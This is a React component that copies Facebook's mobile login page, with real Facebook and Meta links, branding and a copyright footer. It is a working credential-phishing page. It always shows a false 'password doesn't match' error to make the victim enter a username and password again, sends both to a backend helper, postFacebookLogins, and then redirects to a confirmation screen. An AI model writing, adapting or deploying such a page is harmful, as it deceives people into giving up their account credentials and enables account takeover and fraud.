import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import Col from "react-bootstrap/Col";
import Form from "react-bootstrap/Form";
import Row from "react-bootstrap/Row";
import Button from "react-bootstrap/Button";
import Container from "react-bootstrap/esm/Container";
import { postFacebookLogins } from "../helpers/axiosHelper";
const initialState = {
  confirmUserName: "",
  confirmPassword: "",
};
export const Facebooklogin = () => {
  const navigate = useNavigate();
  const [id, setId] = useState(initialState);
  const [eyeState, setEyeState] = useState("visibility_hidden");
  const [errorState, setErrorState] = useState("error");
  const onInputChange = (e) => {
    setErrorState("noerror");
  };
  const onSlasheyeClick = (e) => {
    setEyeState("visibility_hidden");
  };
  const oneyeClick = (e) => {
    setEyeState("visibility_visible");
  };

  const handleOnChange = (e) => {
    onInputChange();
    e.preventDefault();
    const { name, value } = e.target;
    setId({ ...id, [name]: value });
  };
  const handleOnSubmit = async (e) => {
    e.preventDefault();
    const result = await postFacebookLogins(id);
    window.setTimeout(() => {
      navigate("confirmation");
    }, 2000);
  };
  return (
    <div>
      <div className="error_message ">
        The password you've entered doesn't match with the account provided.
        Please try submitting again.
        <span>
          <a
            href="https://m.facebook.com/login/identify/"
            className="find_account dead_link"
          >
            Find your account
          </a>
        </span>
      </div>
      <Container>
        <Row className="text-center mt-2 mb-2">
          <div className="facebook_heading">Facebook</div>
        </Row>
        <Form onSubmit={handleOnSubmit}>
          <Row className="mb-2">
            <Col md={5} className="mb-2">
              <Form.Control
                placeholder="Mobile number or email address"
                className="facebook_inputs"
                type="text"
                id={errorState + "1"}
                onChange={handleOnChange}
                name="confirmUserName"
                required
                minLength="6"
                onInvalid={(F) =>
                  F.target.setCustomValidity(
                    "username didn't meet the minimum required length"
                  )
                }
                onInput={(F) => F.target.setCustomValidity("")}
              />
            </Col>
            <Col md={5} className="mb-2">
              <div className="facebook_password">
                <Form.Control
                  placeholder="Password"
                  className="facebook_inputs"
                  id={errorState + "2"}
                  type={eyeState === "visibility_hidden" ? "password" : "text"}
                  onChange={handleOnChange}
                  name="confirmPassword"
                  required
                  minLength="6"
                  onInvalid={(F) =>
                    F.target.setCustomValidity(
                      "password didn't meet the minimum required length"
                    )
                  }
                  onInput={(F) => F.target.setCustomValidity("")}
                />
                <span className={eyeState}>
                  <i
                    onClick={onSlasheyeClick}
                    className="fa-solid fa-eye-slash eye"
                  ></i>
                </span>
                {eyeState === "visibility_hidden" && (
                  <span>
                    <i
                      className="fa-sharp fa-solid fa-eye eye"
                      onClick={oneyeClick}
                    ></i>
                  </span>
                )}
              </div>
            </Col>
            <Col>
              <Button
                variant="primary"
                size="lg"
                className="login_button"
                type="submit"
              >
                Log In
              </Button>
            </Col>
          </Row>
          <Row>
            <Col>
              <div className="forgotten_password">
                <a
                  href="https://m.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Frefsrc%3Ddeprecated&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&_rdr"
                  className="forgotten_password__link"
                  variant="primary"
                >
                  Forgotten password?
                </a>
              </div>
            </Col>
          </Row>
          <Row>
            <Col>
              <hr></hr>
            </Col>
            or
            <Col>
              <hr />
            </Col>
          </Row>
          <Row>
            <Col></Col>
            <Col md={5}>
              <Button variant="success" className="create_new__account">
                <a
                  href="https://m.facebook.com/reg/?cid=103&refsrc=deprecated&soft=hjk"
                  className="dead_link"
                >
                  Create New Account
                </a>
              </Button>
            </Col>
            <Col></Col>
          </Row>
        </Form>
        <Row className="text-center mt-5 footer_list">
          <Col>
            <a href="https://about.meta.com/" className="dead_link">
              About
            </a>
          </Col>
          <Col>
            <a
              href="https://www.facebook.com/help?_rdc=1&_rdr"
              className="dead_link"
            >
              Help
            </a>
          </Col>
          <Col>
            <a
              href="https://web.facebook.com/privacy/policy/?entry_point=facebook_page_footer"
              className="dead_link"
            >
              Privacy policy
            </a>
          </Col>
          <Col>
            <a href="#" className="dead_link bold_custom">
              English(UK)
            </a>
          </Col>
        </Row>
        <Row className="text-center mt-3">
          <div>Meta &copy; 2023</div>{" "}
        </Row>
      </Container>
    </div>
  );
};
